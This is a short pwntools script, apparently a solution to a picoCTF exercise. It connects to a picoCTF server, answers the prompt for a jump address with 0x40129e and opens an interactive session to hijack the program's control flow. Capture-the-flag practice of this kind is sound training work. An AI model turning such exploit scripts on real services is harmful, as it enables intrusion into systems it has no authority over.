from pwn import *

io = remote('saturn.picoctf.net', 52975)

io.recvuntil(b'Enter the address in hex to jump to, excluding \'0x\': ')

io.sendline(b'000000000040129e')
io.interactive()